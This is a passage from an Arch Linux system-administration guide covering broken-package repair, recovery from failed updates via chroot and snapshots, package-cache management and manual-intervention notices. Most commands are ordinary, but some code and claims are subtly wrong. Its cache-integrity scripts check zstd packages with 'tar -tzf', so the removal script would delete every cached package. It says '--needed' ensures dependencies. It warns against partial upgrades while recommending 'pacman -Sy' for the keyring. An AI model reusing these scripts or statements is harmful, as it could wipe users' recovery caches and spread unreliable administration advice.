```
cd ~/.cache/yay/package-name  # or paru cache
git pull
makepkg -Ccsi
```

Clean rebuild from updated source.

### Repairing Broken Packages

#### Reinstallation

**Simple reinstall:**
```
sudo pacman -S package-name
```

Reinstalls the package, replacing corrupted or missing files.

**Force reinstall:**
```
sudo pacman -S --overwrite '*' package-name
```

Overwrites all files, including modified ones.

**Reinstall with dependencies:**
```
sudo pacman -S --needed package-name
```

Ensures all dependencies are present.

#### Downgrading Broken Packages

**From cache:**
```
sudo pacman -U /var/cache/pacman/pkg/package-name-old-version.pkg.tar.zst
```

**From Arch Archive:**
```
# Visit https://archive.archlinux.org/packages/p/package-name/
wget https://archive.archlinux.org/packages/p/package-name/package-name-version.pkg.tar.zst
sudo pacman -U package-name-version.pkg.tar.zst
```

**Hold the downgraded version:**
```
# Add to /etc/pacman.conf
IgnorePkg = package-name
```

#### Database-Only Reinstallation

**Update database without touching files:**
```
sudo pacman -S --dbonly package-name
```

Useful when files are correct but database entry is corrupted.

**Warning:** Only use if files are actually present and correct.

### Fixing Missing Libraries

#### Identifying Missing Libraries

**Check program dependencies:**
```
ldd /usr/bin/program
```

**Output:**
```
libfoo.so.5 => not found
libbar.so.2 => /usr/lib/libbar.so.2 (0x00007f...)
```

"not found" indicates missing library.

#### Finding Which Package Provides Library

**Search files database:**
```
pacman -F libfoo.so.5
```

Shows which package provides the library.

**If files database is outdated:**
```
sudo pacman -Fy
pacman -F libfoo.so.5
```

**Install providing package:**
```
sudo pacman -S package-providing-lib
```

#### Symlink Missing Libraries (Temporary)

**If library exists with different version:**
```
ls /usr/lib/libfoo.so*
# Shows: libfoo.so.6

sudo ln -s /usr/lib/libfoo.so.6 /usr/lib/libfoo.so.5
```

**Warning:** This is a temporary workaround. Proper solution is updating or rebuilding the dependent package.

### Rebuilding AUR Packages

#### When to Rebuild

**After system library updates:**
- New glibc version
- Major Python/Perl version changes
- Updated shared libraries

**Symptoms of needing rebuild:**
```
error while loading shared libraries
segmentation fault
undefined symbol errors
```

#### Rebuild Process

**Using yay:**
```
yay -S package-name --rebuild
```

**Using paru:**
```
paru -S package-name --rebuild
```

**Manual rebuild:**
```
cd ~/.cache/yay/package-name
makepkg -Ccsi
```

The `-C` flag cleans previous build artifacts.

#### Rebuild All Foreign Packages

**Rebuild all AUR packages:**
```
yay -S $(pacman -Qmq) --rebuild
```

**Warning:** Time-consuming; only necessary after major system changes.

### Database Corruption Recovery

#### Symptoms

```
error: could not open file /var/lib/pacman/local/package-name/desc
error: failed to prepare transaction (database is not valid)
```

#### Step-by-Step Recovery

**1. Check database integrity:**
```
sudo pacman -Dk
```

**2. Backup database:**
```
sudo cp -a /var/lib/pacman /var/lib/pacman.bak
```

**3. Refresh sync databases:**
```
sudo pacman -Syy
```

**4. Reinstall broken package:**
```
sudo pacman -S package-name --overwrite '*'
```

**5. If widespread corruption, rebuild database:**
```
sudo pacman -S $(pacman -Qq) --overwrite '*'
```

**Warning:** Last resort; reinstalls all packages.

### Fixing Specific Breakage Scenarios

#### Broken Python Packages

**Symptom:**
```
ModuleNotFoundError: No module named 'module_name'
```

**Cause:** Python version upgrade broke site-packages.

**Solution:**
```
sudo pacman -S python
pip list --user  # Check user-installed packages
pip install --user --force-reinstall package-name
```

**For system packages:**
```
sudo pacman -S python-package-name
```

#### Broken Kernel Modules

**Symptom:**
```
modprobe: FATAL: Module not found
```

**Cause:** Kernel upgrade without rebuilding DKMS modules.

**Solution:**
```
sudo dkms autoinstall
sudo mkinitcpio -P
```

Or reinstall module packages:
```
sudo pacman -S nvidia-dkms virtualbox-host-dkms
```

#### Broken Bootloader

**Symptom:**
System won't boot after upgrade.

**Solution (from live USB):**
```
# Mount and chroot
mount /dev/sdXn /mnt
arch-chroot /mnt

# Reinstall bootloader
pacman -S grub
grub-install /dev/sdX
grub-mkconfig -o /boot/grub/grub.cfg

# Or for systemd-boot
bootctl install
```

#### Broken Initramfs

**Symptom:**
Kernel panic, can't find root filesystem.

**Solution (from live USB):**
```
arch-chroot /mnt
mkinitcpio -P
```

### Preventive Measures

#### Regular Integrity Checks

**Weekly verification:**
```
#!/bin/bash
# /usr/local/bin/check-package-integrity

BROKEN=$(paccheck --sha256sum --quiet 2>&1)

if [ -n "$BROKEN" ]; then
    echo "Broken packages detected:"
    echo "$BROKEN"
    exit 1
else
    echo "All packages OK"
fi
```

**Schedule with cron:**
```
0 3 * * 0 /usr/local/bin/check-package-integrity
```

#### Pacman Hooks for Automatic Checks

```
# /etc/pacman.d/hooks/check-integrity.hook
[Trigger]
Operation = Upgrade
Operation = Install
Type = Package
Target = *

[Action]
Description = Verifying package integrity...
When = PostTransaction
Exec = /usr/bin/pacman -Dk
```

#### Maintain Package Cache

**Keep recent versions for downgrading:**
```
sudo paccache -rk3
```

Retains 3 versions for easy rollback.

#### System Snapshots

**Using Btrfs snapshots:**
```
sudo btrfs subvolume snapshot / /.snapshots/$(date +%Y%m%d)
```

**Using Timeshift:**
```
sudo pacman -S timeshift
sudo timeshift --create --comments "Before upgrade"
```

### Recovery Tools

#### Using pacman-static

When pacman itself is broken:
```
wget https://pkgbuild.com/~morganamilo/pacman-static/x86_64/bin/pacman-static
chmod +x pacman-static
sudo ./pacman-static -Syu pacman
```

Static binary works without library dependencies.

#### Emergency Recovery Script

```bash
#!/bin/bash
# Emergency package repair script

echo "=== Emergency Package Repair ==="

# Remove lock file
rm -f /var/lib/pacman/db.lck

# Refresh databases
pacman -Syy

# Check for broken packages
echo "Checking for broken packages..."
BROKEN=$(pacman -Qkk 2>&1 | grep -v "0 altered files" | cut -d: -f1 | sort -u)

if [ -n "$BROKEN" ]; then
    echo "Reinstalling broken packages..."
    pacman -S $BROKEN --overwrite '*' --noconfirm
else
    echo "No broken packages found"
fi

# Verify integrity
pacman -Dk

echo "=== Repair Complete ==="
```

### Best Practices

**Regular updates:** Keep system current to avoid compatibility issues.

**Read upgrade notes:** Check Arch news before major upgrades.

**Test before committing:** Review package lists before confirming installation.

**Verify after upgrades:** Run integrity checks after major updates.

**Maintain backups:** Keep system snapshots for quick recovery.

**Document issues:** Note what caused breakage and how you fixed it.

**Don't force solutions:** Understand root cause before using --overwrite or --nodeps.

**Rebuild AUR packages:** Update AUR packages after system library changes.

**Check logs:** Review `/var/log/pacman.log` for clues about breakage.

**Ask for help:** Consult forums/wiki when encountering unfamiliar breakage.

Proper diagnosis and repair of broken packages prevents system instability and ensures reliable operation of your Arch Linux installation

# Recovery Procedures

## System Recovery from Failed Updates

### Overview

Failed updates can leave Arch Linux systems in various states of dysfunction, from minor package issues to complete boot failures. Systematic recovery procedures restore functionality while preserving data and system configuration.

### Assessment and Triage

#### Determine System State

**System boots normally:**
- Minor issues, easiest to fix
- Full pacman access available
- Recovery from running system

**System boots to terminal (no GUI):**
- Display manager or desktop environment broken
- Can use command line
- Most tools available

**System boots to emergency/rescue mode:**
- Critical system components damaged
- Limited functionality
- May need chroot recovery

**System doesn't boot:**
- Most severe situation
- Requires live USB recovery
- Full chroot procedure needed

### Recovery from Running System

#### Step 1: Gather Information

**Check pacman log for what failed:**
```
tail -n 100 /var/log/pacman.log
grep "error:" /var/log/pacman.log | tail -20
grep "warning:" /var/log/pacman.log | tail -20
```

**Check system journal:**
```
journalctl -b -p err
journalctl -xb | grep -i error
```

**Identify last successful operation:**
```
grep "starting full system upgrade" /var/log/pacman.log | tail -1
grep "transaction completed" /var/log/pacman.log | tail -1
```

#### Step 2: Remove Lock File

If update was interrupted:
```
sudo rm /var/lib/pacman/db.lck
```

Only after verifying no pacman process is running:
```
ps aux | grep pacman
```

#### Step 3: Clean Corrupted Cache

Remove potentially corrupted downloads:
```
sudo pacman -Scc
```

Confirm removal of all cached packages, forcing fresh downloads.

#### Step 4: Refresh Databases

Force complete database refresh:
```
sudo pacman -Syy
```

#### Step 5: Update Keyring

Outdated keys often cause failures:
```
sudo pacman -Sy archlinux-keyring
sudo pacman-key --populate archlinux
```

#### Step 6: Complete the Update

Attempt to finish the upgrade:
```
sudo pacman -Syu
```

Watch for errors and address them as they appear.

#### Step 7: Fix Broken Packages

**Reinstall packages with errors:**
```
sudo pacman -S package-name --overwrite '*'
```

**Check for broken dependencies:**
```
sudo pacman -Dk
```

**Verify file integrity:**
```
pacman -Qkk | grep -v "0 altered files"
```

### Recovery from Terminal-Only Boot

#### Display Manager Won't Start

**Common symptoms:**
- System boots to TTY login
- startx or display manager fails
- GUI completely unavailable

**Diagnosis:**
```
sudo systemctl status display-manager
journalctl -u display-manager -b
```

**Solutions:**

**1. Reinstall display manager:**
```
sudo pacman -S gdm  # or sddm, lightdm, etc.
```

**2. Reinstall graphics drivers:**
```
# For NVIDIA
sudo pacman -S nvidia nvidia-utils

# For AMD
sudo pacman -S xf86-video-amdgpu

# For Intel
sudo pacman -S xf86-video-intel
```

**3. Reinstall Xorg:**
```
sudo pacman -S xorg-server xorg-xinit
```

**4. Rebuild initramfs:**
```
sudo mkinitcpio -P
```

**5. Reboot:**
```
sudo reboot
```

#### Desktop Environment Broken

**KDE Plasma:**
```
sudo pacman -S plasma-meta kde-applications-meta
```

**GNOME:**
```
sudo pacman -S gnome gnome-extra
```

**Xfce:**
```
sudo pacman -S xfce4 xfce4-goodies
```

### Recovery from Emergency/Rescue Mode

#### Boot Options

**Access GRUB menu:**
Press `e` at GRUB to edit boot parameters.

**Add to kernel line:**
```
systemd.unit=rescue.target
```

Or:
```
systemd.unit=emergency.target
```

**Boot in single-user mode:**
```
single
```

Or:
```
init=/bin/bash
```

#### Remount Root Filesystem

Emergency mode often mounts root read-only:
```
mount -o remount,rw /
```

#### Basic Recovery Steps

**1. Remove lock file:**
```
rm /var/lib/pacman/db.lck
```

**2. Check network connectivity:**
```
ping -c 3 archlinux.org
```

If network is down:
```
systemctl start NetworkManager
# or
dhcpcd
```

**3. Attempt update:**
```
pacman -Syu
```

**4. Fix critical packages:**
```
pacman -S systemd glibc bash coreutils
```

**5. Reboot:**
```
systemctl reboot
```

### Recovery Using Live USB

#### Preparation

**Boot from Arch installation media:**
- Create bootable USB with latest Arch ISO
- Boot system from USB
- Wait for live environment prompt

#### Mount System Partitions

**Identify partitions:**
```
lsblk
fdisk -l
```

**Mount root partition:**
```
mount /dev/sdXn /mnt
```

**Mount boot partition (if separate):**
```
mount /dev/sdXn /mnt/boot
```

**Mount EFI partition (if UEFI):**
```
mount /dev/sdXn /mnt/boot/efi
```

**Mount other partitions:**
```
mount /dev/sdXn /mnt/home
```

#### Chroot into System

**Mount virtual filesystems:**
```
mount --bind /dev /mnt/dev
mount --bind /dev/pts /mnt/dev/pts
mount --bind /proc /mnt/proc
mount --bind /sys /mnt/sys
mount --bind /run /mnt/run
```

**Or use arch-chroot (easier):**
```
arch-chroot /mnt
```

This automatically handles all virtual filesystem mounts.

#### Recovery Operations in Chroot

**1. Remove lock file:**
```
rm /var/lib/pacman/db.lck
```

**2. Configure network (if needed):**
```
# Copy DNS settings from live environment
cp /etc/resolv.conf /mnt/etc/resolv.conf
```

**3. Refresh databases:**
```
pacman -Syy
```

**4. Update keyring:**
```
pacman -S archlinux-keyring
```

**5. Complete update:**
```
pacman -Syu
```

**6. Reinstall critical packages:**
```
pacman -S linux linux-headers base base-devel
```

**7. Rebuild initramfs:**
```
mkinitcpio -P
```

**8. Reinstall bootloader:**

**For GRUB:**
```
grub-install /dev/sdX
grub-mkconfig -o /boot/grub/grub.cfg
```

**For systemd-boot:**
```
bootctl install
bootctl update
```

**9. Exit and reboot:**
```
exit
umount -R /mnt
reboot
```

### Specific Recovery Scenarios

#### Kernel Update Failed

**Symptoms:**
- System won't boot
- Kernel panic
- Missing kernel modules

**Recovery:**

**1. Boot from live USB and chroot**

**2. Reinstall kernel:**
```
pacman -S linux linux-headers
```

**Or install LTS kernel for stability:**
```
pacman -S linux-lts linux-lts-headers
```

**3. Rebuild initramfs:**
```
mkinitcpio -P
```

**4. Update bootloader:**
```
grub-mkconfig -o /boot/grub/grub.cfg
```

**5. Reboot**

#### Bootloader Broken

**GRUB not found or errors:**

**Recovery:**
```
# From chroot
pacman -S grub
grub-install /dev/sdX
grub-mkconfig -o /boot/grub/grub.cfg
```

**systemd-boot missing:**
```
# From chroot
bootctl install
mkdir -p /boot/loader/entries
# Recreate boot entries
```

#### Critical System Libraries Broken

**glibc, systemd, or bash corrupted:**

**Recovery:**
```
# From chroot or using pacman-static
pacman -S glibc systemd bash coreutils --overwrite '*'
```

#### Database Completely Corrupted

**Extreme case - rebuild entire database:**

**1. List installed packages from log:**
```
grep "installed" /var/log/pacman.log | awk '{print $4}' | sort -u > /tmp/installed.txt
```

**2. Reinstall all packages:**
```
pacman -S $(cat /tmp/installed.txt) --overwrite '*'
```

**Warning:** This is time-consuming and a last resort.

### Rollback Strategies

#### Downgrade to Previous Versions

**From cache:**
```
cd /var/cache/pacman/pkg/
sudo pacman -U package-name-old-version.pkg.tar.zst
```

**Downgrade multiple packages:**
```
sudo pacman -U /var/cache/pacman/pkg/package1-old.pkg.tar.zst \
               /var/cache/pacman/pkg/package2-old.pkg.tar.zst
```

**From Arch Archive:**
```
# Visit https://archive.archlinux.org/
wget https://archive.archlinux.org/packages/p/package-name/package-name-version.pkg.tar.zst
sudo pacman -U package-name-version.pkg.tar.zst
```

**Hold packages to prevent re-upgrade:**
```
# Add to /etc/pacman.conf
IgnorePkg = package-name package-name2
```

#### Snapshot Rollback

**Using Btrfs snapshots:**
```
# Boot from live USB
mount /dev/sdXn /mnt
btrfs subvolume list /mnt
btrfs subvolume delete /mnt/@
btrfs subvolume snapshot /mnt/@snapshots/snapshot-name /mnt/@
reboot
```

**Using Timeshift:**
```
# Boot from live USB
timeshift --restore
# Follow prompts to select snapshot
```

**Using LVM snapshots:**
```
# From live USB
lvconvert --merge /dev/vg/snapshot
reboot
```

### Preventive Measures

#### Pre-Update Preparations

**1. Read Arch news:**
```
https://archlinux.org/news/
```

Check for manual intervention requirements.

**2. Create snapshot:**
```
sudo timeshift --create --comments "Before $(date +%Y%m%d) update"
```

Or Btrfs:
```
sudo btrfs subvolume snapshot / /.snapshots/$(date +%Y%m%d)-pre-update
```

**3. Backup critical **
```
sudo rsync -av /etc /backup/etc-$(date +%Y%m%d)
sudo rsync -av /home /backup/home-$(date +%Y%m%d)
```

**4. Ensure adequate disk space:**
```
df -h /
```

Keep at least 20% free.

**5. Update keyring first:**
```
sudo pacman -Sy archlinux-keyring
```

#### Safe Update Practices

**Full system updates only:**
```
sudo pacman -Syu  # Good
```

**Never partial upgrades:**
```
sudo pacman -Sy package-name  # Bad - causes breakage
```

**Monitor update process:**
- Watch for warnings
- Note which packages are updating
- Don't interrupt critical operations

**Test after updates:**
```
# Verify boot
sudo journalctl -b -p err

# Check services
systemctl --failed

# Test critical applications
```

### Recovery Toolkit

#### Essential Tools to Keep Available

**Live USB with latest Arch ISO:**
- Keep updated monthly
- Test that it boots

**Package cache:**
- Don't delete with `pacman -Scc` too frequently
- Keep at least 2-3 versions with `paccache -rk3`

**Documentation:**
- Save this guide offline
- Keep Arch Wiki pages saved

**External backups:**
- Regular system snapshots
- Critical data backups

### Best Practices

**Update regularly:** Small frequent updates are safer than large infrequent ones.

**Read before updating:** Check Arch news for manual interventions.

**Create snapshots:** Snapshot before every major update.

**Keep rescue tools ready:** Bootable USB and recovery knowledge.

**Document your system:** Know what's installed and why.

**Test in stages:** Update non-critical systems first.

**Maintain backups:** Regular backups of critical data and configs.

**Don't panic:** Systematic recovery usually succeeds.

**Learn from failures:** Understand what went wrong to prevent recurrence.

**Ask for help:** Arch forums and IRC are helpful when stuck.

System recovery from failed updates is usually successful with methodical troubleshooting and the right recovery tools. Preparation and prevention are the best strategies.

## Package Cache Utilization for Recovery

### Overview

The package cache in `/var/cache/pacman/pkg/` is a critical recovery resource, storing downloaded package files that enable offline reinstallation, downgrades, and system recovery without internet access. Effective cache management balances disk space with recovery capabilities.

### Cache as Recovery Tool

#### Why Cache Matters for Recovery

**Offline reinstallation:**
- Reinstall packages without internet
- Repair broken installations
- Restore accidentally removed packages

**Downgrade capability:**
- Roll back problematic updates
- Restore system to working state
- Test different package versions

**System recovery:**
- Fix corrupted installations
- Rebuild package database
- Recover from failed updates

**Emergency operations:**
- Critical when mirrors are unavailable
- Essential during network outages
- Vital for isolated systems

### Cache Location and Structure

#### Default Cache Directory

```
/var/cache/pacman/pkg/
```

**Package file format:**
```
package-name-version-release-architecture.pkg.tar.zst
```

**Example:**
```
linux-6.6.1.arch1-1-x86_64.pkg.tar.zst
firefox-120.0-1-x86_64.pkg.tar.zst
```

#### Multiple Cache Directories

Configure additional cache locations in `/etc/pacman.conf`:

```
[options]
CacheDir = /var/cache/pacman/pkg/
CacheDir = /mnt/external/cache/
CacheDir = /mnt/backup/pkg-archive/
```

Pacman searches all directories when looking for cached packages.

### Using Cache for Recovery

#### Reinstalling from Cache

**Basic reinstallation:**
```
sudo pacman -U /var/cache/pacman/pkg/package-name-version.pkg.tar.zst
```

Reinstalls from cached file without downloading.

**Reinstall with dependency resolution:**
```
sudo pacman -U /var/cache/pacman/pkg/package-name-*.pkg.tar.zst
```

Uses wildcard to match current version in cache.

**Force reinstallation over existing files:**
```
sudo pacman -U --overwrite '*' /var/cache/pacman/pkg/package-name-*.pkg.tar.zst
```

Overwrites conflicting files during reinstallation.

#### Downgrading Packages

**Find available versions:**
```
ls /var/cache/pacman/pkg/package-name-*
```

**Output example:**
```
package-name-1.0-1-x86_64.pkg.tar.zst
package-name-1.1-1-x86_64.pkg.tar.zst
package-name-1.2-1-x86_64.pkg.tar.zst
```

**Downgrade to specific version:**
```
sudo pacman -U /var/cache/pacman/pkg/package-name-1.0-1-x86_64.pkg.tar.zst
```

**Prevent automatic upgrade:**
Add to `/etc/pacman.conf`:
```
IgnorePkg = package-name
```

#### Mass Reinstallation

**Reinstall all cached packages:**
```
sudo pacman -U /var/cache/pacman/pkg/*.pkg.tar.zst
```

**Warning:** This reinstalls everything in cache; use selectively.

**Reinstall specific package family:**
```
sudo pacman -U /var/cache/pacman/pkg/kde-*
```

Reinstalls all KDE-related packages from cache.

### Recovery Scenarios Using Cache

#### Scenario 1: Broken Package After Update

**Problem:** Package updated but doesn't work.

**Solution using cache:**

**1. Identify previous version:**
```
ls -lt /var/cache/pacman/pkg/package-name-* | head -5
```

**2. Downgrade:**
```
sudo pacman -U /var/cache/pacman/pkg/package-name-old-version.pkg.tar.zst
```

**3. Hold package:**
```
# Add to /etc/pacman.conf
IgnorePkg = package-name
```

**4. Report issue and wait for fix**

#### Scenario 2: Critical Package Corrupted

**Problem:** Essential package files corrupted, system unstable.

**Solution using cache:**

**1. Check cache for current version:**
```
pacman -Q package-name
ls /var/cache/pacman/pkg/package-name-$(pacman -Q package-name | awk '{print $2}')*
```

**2. Reinstall from cache:**
```
sudo pacman -U --overwrite '*' /var/cache/pacman/pkg/package-name-current-version.pkg.tar.zst
```

**3. Verify integrity:**
```
pacman -Qkk package-name
```

#### Scenario 3: Network Unavailable During Recovery

**Problem:** Need to reinstall packages but no internet.

**Solution using cache:**

**1. List what's available in cache:**
```
ls /var/cache/pacman/pkg/ | grep package-name
```

**2. Install from cache:**
```
sudo pacman -U /var/cache/pacman/pkg/package-*.pkg.tar.zst
```

**3. Satisfy dependencies from cache:**
```
# Install dependency chain
sudo pacman -U /var/cache/pacman/pkg/dep1-*.pkg.tar.zst \
               /var/cache/pacman/pkg/dep2-*.pkg.tar.zst \
               /var/cache/pacman/pkg/package-*.pkg.tar.zst
```

#### Scenario 4: Database Corruption

**Problem:** Pacman database corrupted, need to rebuild.

**Solution using cache:**

**1. Backup corrupted database:**
```
sudo cp -a /var/lib/pacman /var/lib/pacman.bak
```

**2. Reinstall all packages from cache to rebuild database:**
```
# Create list of installed packages
pacman -Qq > /tmp/installed-list.txt

# Reinstall each from cache
for pkg in $(cat /tmp/installed-list.txt); do
    PKG_FILE=$(ls /var/cache/pacman/pkg/${pkg}-*.pkg.tar.zst 2>/dev/null | tail -1)
    if [ -f "$PKG_FILE" ]; then
        sudo pacman -U --dbonly "$PKG_FILE"
    fi
done
```

**3. Verify and fix:**
```
sudo pacman -Dk
sudo pacman -Syu
```

#### Scenario 5: Kernel Boot Failure

**Problem:** New kernel doesn't boot, need to restore old kernel.

**Solution using cache:**

**1. Boot from live USB and chroot**

**2. Find previous kernel in cache:**
```
ls -lt /mnt/var/cache/pacman/pkg/linux-* | grep -v headers | head -5
```

**3. Install old kernel from cache:**
```
pacman -U --root /mnt /mnt/var/cache/pacman/pkg/linux-old-version.pkg.tar.zst
pacman -U --root /mnt /mnt/var/cache/pacman/pkg/linux-headers-old-version.pkg.tar.zst
```

**4. Rebuild initramfs:**
```
arch-chroot /mnt mkinitcpio -P
```

**5. Update bootloader:**
```
arch-chroot /mnt grub-mkconfig -o /boot/grub/grub.cfg
```

**6. Reboot**

### Cache Preservation Strategies

#### Retain Critical Package Versions

**Keep multiple versions of important packages:**
```
sudo paccache -rk5
```

Keeps 5 versions instead of default 3.

**Selective retention for critical packages:**
```bash
#!/bin/bash
# Aggressive general cleanup but preserve kernel versions

# Remove uninstalled packages
paccache -ruk0

# Keep 1 version for most packages
paccache -rk1

# Manually preserve more kernel versions
# (Don't delete from cache)
echo "Kernel versions preserved:"
ls /var/cache/pacman/pkg/linux-[0-9]* | tail -10
```

#### Archive Old Versions

**Move old packages to archive instead of deleting:**
```
sudo mkdir -p /var/cache/pacman/archive/
sudo paccache -m /var/cache/pacman/archive/ -rk1
```

The `-m` flag moves packages instead of deleting them.

**Organize by date:**
```
ARCHIVE_DIR="/var/cache/pacman/archive/$(date +%Y%m%d)"
sudo mkdir -p "$ARCHIVE_DIR"
sudo paccache -m "$ARCHIVE_DIR" -rk1
```

#### External Backup of Cache

**Backup cache to external storage:**
```
sudo rsync -av --progress /var/cache/pacman/pkg/ /mnt/external/pkg-backup/
```

**Periodic automated backup:**
```bash
#!/bin/bash
# /usr/local/bin/backup-pkg-cache

BACKUP_DIR="/mnt/external/pkg-backup/$(date +%Y%m%d)"
mkdir -p "$BACKUP_DIR"

rsync -av --delete /var/cache/pacman/pkg/ "$BACKUP_DIR/"

# Keep only last 6 months of backups
find /mnt/external/pkg-backup/ -maxdepth 1 -type d -mtime +180 -exec rm -rf {} \;
```

**Schedule with cron:**
```
0 2 * * 0 /usr/local/bin/backup-pkg-cache
```

Runs weekly on Sunday at 2 AM.

### Creating Local Repository from Cache

#### Convert Cache to Local Repository

**Create repository database:**
```
cd /var/cache/pacman/pkg/
sudo repo-add custom.db.tar.gz *.pkg.tar.zst
```

**Add to `/etc/pacman.conf`:**
```
[custom]
SigLevel = Optional TrustAll
Server = file:///var/cache/pacman/pkg
```

**Synchronize:**
```
sudo pacman -Sy
```

**Benefits:**
- Packages appear in repository listings
- Easier searching with `pacman -Ss`
- Dependency resolution from local packages
- Useful for offline installations

#### Maintain Local Repository

**Update when adding packages:**
```
sudo repo-add /var/cache/pacman/pkg/custom.db.tar.gz /var/cache/pacman/pkg/new-package.pkg.tar.zst
```

**Rebuild entire database:**
```
cd /var/cache/pacman/pkg/
sudo rm custom.db*
sudo repo-add custom.db.tar.gz *.pkg.tar.zst
```

### Cache Sharing for Multiple Systems

#### Network-Shared Cache

**Server setup (NFS example):**
```
# Install NFS server
sudo pacman -S nfs-utils

# Export cache directory
# Add to /etc/exports:
/var/cache/pacman/pkg 192.168.1.0/24(ro,sync,no_subtree_check)

# Start NFS server
sudo systemctl enable --now nfs-server
```

**Client setup:**
```
# Mount shared cache
sudo mount server:/var/cache/pacman/pkg /mnt/shared-cache

# Configure pacman to use shared cache
# Add to /etc/pacman.conf:
CacheDir = /mnt/shared-cache
CacheDir = /var/cache/pacman/pkg
```

**Benefits:**
- Reduces redundant downloads across network
- Centralized cache management
- All systems benefit from any download

### Cache Verification and Maintenance

#### Verify Cache Integrity

**Check for corrupted packages:**
```bash
#!/bin/bash
# Verify all cached packages

for pkg in /var/cache/pacman/pkg/*.pkg.tar.zst; do
    if ! tar -tzf "$pkg" &>/dev/null; then
        echo "Corrupted: $pkg"
    fi
done
```

**Remove corrupted packages:**
```bash
#!/bin/bash
# Remove corrupted packages from cache

for pkg in /var/cache/pacman/pkg/*.pkg.tar.zst; do
    if ! tar -tzf "$pkg" &>/dev/null; then
        echo "Removing corrupted: $pkg"
        rm "$pkg"
    fi
done
```

#### Remove Duplicate Versions

Sometimes multiple downloads create duplicates:

```bash
#!/bin/bash
# Keep only newest file for each package version

cd /var/cache/pacman/pkg/
for pkg in *.pkg.tar.zst; do
    BASE="${pkg%.pkg.tar.zst}"
    # Find duplicates
    DUPES=$(ls "${BASE}"*.pkg.tar.zst 2>/dev/null | wc -l)
    if [ $DUPES -gt 1 ]; then
        # Keep newest, remove others
        ls -t "${BASE}"*.pkg.tar.zst | tail -n +2 | xargs rm
    fi
done
```

### Best Practices for Recovery-Focused Cache Management

#### Balanced Retention Policy

**Conservative approach (recommended):**
```
sudo paccache -rk3      # Keep 3 versions of installed
sudo paccache -ruk1     # Keep 1 version of uninstalled
```

Provides downgrade capability while managing space.

**Aggressive approach (limited space):**
```
sudo paccache -rk1      # Keep 1 version of installed
sudo paccache -ruk0     # Remove all uninstalled
```

Minimal space usage, limited recovery options.

**Archival approach (ample space):**
```
# Don't use paccache; keep everything
# Or keep many versions:
sudo paccache -rk10
```

Maximum recovery capability, high space usage.

#### Critical Package Preservation

**Never delete critical package versions:**
- Current and previous kernel
- Current bootloader
- Current and previous glibc
- Current systemd

**Exclude from automatic cleaning:**
```bash
#!/bin/bash
# Custom cache cleaning preserving critical packages

CRITICAL_PKGS="linux linux-headers glibc systemd grub"

# Clean normally
paccache -rk1

# Restore critical packages (keep 5 versions)
for pkg in $CRITICAL_PKGS; do
    # Restore from archive or don't delete in first place
    echo "Preserved: $pkg"
done
```

#### Regular Cache Audits

**Monthly cache review:**
```
# Check cache size
du -sh /var/cache/pacman/pkg/

# Count packages
ls /var/cache/pacman/pkg/*.pkg.tar.zst | wc -l

# Identify largest packages
du -h /var/cache/pacman/pkg/*.pkg.tar.zst | sort -rh | head -20

# Clean based on findings
sudo paccache -rk3
```

### Emergency Recovery Procedures

#### Using Cache in Chroot

**From live USB:**
```
# Mount system
mount /dev/sdXn /mnt
arch-chroot /mnt

# Cache is available at standard location
ls /var/cache/pacman/pkg/

# Reinstall from cache
pacman -U /var/cache/pacman/pkg/package-*.pkg.tar.zst
```

#### Restoring from Archived Cache

**If you moved cache to archive:**
```
# Copy needed packages back
sudo cp /var/cache/pacman/archive/package-*.pkg.tar.zst /var/cache/pacman/pkg/

# Install
sudo pacman -U /var/cache/pacman/pkg/package-*.pkg.tar.zst
```

### Documentation and Tracking

#### Cache Inventory

**Maintain list of cached packages:**
```bash
#!/bin/bash
# Generate cache inventory

ls /var/cache/pacman/pkg/*.pkg.tar.zst | \
    sed 's|/var/cache/pacman/pkg/||' | \
    sed 's|\.pkg\.tar\.zst||' > /var/cache/pacman/inventory-$(date +%Y%m%d).txt
```

**Benefits:**
- Know what's available for recovery
- Plan cache cleaning decisions
- Track cache growth over time

The package cache is your safety net for system recovery, enabling downgrades, offline operations, and rebuilding without internet access. Proper cache management preserves recovery capability while controlling disk usage.

## Manual Intervention Scenarios

### Overview

Manual intervention scenarios occur when Arch Linux updates require user action beyond standard package installation. These situations are announced on the Arch Linux news page and require careful attention to prevent system breakage.

### Sources of Manual Intervention Notices

#### Arch Linux News

**Official news page:**
```
https://archlinux.org/news/
```

Always check before major updates.

**RSS feed:**
```
https://archlinux.org/feeds/news/
```

Subscribe for automatic notifications.

**Check news from terminal:**
```
curl -s https://archlinux.org/feeds/news/ | grep -E '<title>|<pubDate>' | head -20
```

Shows recent news items.

#### Package Install Messages

**Post-install scriptlets:**
During package installation, watch for messages like:
```
:: Important notice from package-name:
   Manual intervention required - see https://archlinux.org/news/...
```

**Save to log:**
```
sudo pacman -Syu 2>&1 | tee pacman-upgrade.log
```

Review log for important notices.

### Common Manual Intervention Categories

#### Filesystem Changes

**Restructuring system paths:**
- Moving directories
- Changing file locations
- Symlink replacements

**Configuration file migrations:**
- Format changes
- Location changes
- Syntax updates

#### Package Splits and Merges

**Package splitting:**
One package becomes multiple smaller packages.

**Package merging:**
Multiple packages consolidated into one.

**Provider changes:**
New package provides functionality of old package.

#### Configuration Format Changes

**New configuration syntax:**
- systemd unit file changes
- Application config format updates
- Service configuration restructuring

#### Deprecated Features

**Removal warnings:**
- Features being phased out
- Compatibility layers removed
- API changes requiring adaptation

### Historical Examples

#### Example 1: Filesystem Package Update (2013)

**Announcement:** "Binaries move to /usr/bin"

**Issue:** `/bin`, `/sbin`, `/usr/sbin` merged into `/usr/bin`

**Manual steps required:**
```
# Before upgrade
pacman -Syu --ignore filesystem,bash
pacman -S bash
pacman -Su
```

**Reason:** Prevented broken system during directory restructuring.

#### Example 2: Glibc Locale Generation (2015)

**Announcement:** "Glibc locale generation changes"

**Issue:** Locale generation method changed

**Manual steps required:**
```
# Uncomment needed locales in /etc/locale.gen
sudo nano /etc/locale.gen

# Regenerate locales
sudo locale-gen
```

**Reason:** System wouldn't generate locales properly without intervention.

#### Example 3: OpenSSH 9.0 Update (2022)

**Announcement:** "OpenSSH 9.0 deprecates SHA-1 signatures"

**Issue:** Old SSH keys using SHA-1 no longer accepted by default

**Manual steps required:**
```
# Generate new key with modern algorithm
ssh-keygen -t ed25519

# Or configure legacy support temporarily
# Add to ~/.ssh/config:
Host old-server
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
```

**Reason:** Security improvement requiring key updates.

#### Example 4: Arch Linux Keyring Master Key Rotation (2023)

**Announcement:** "Arch Linux keyring master key rotation"

**Issue:** Master signing keys updated

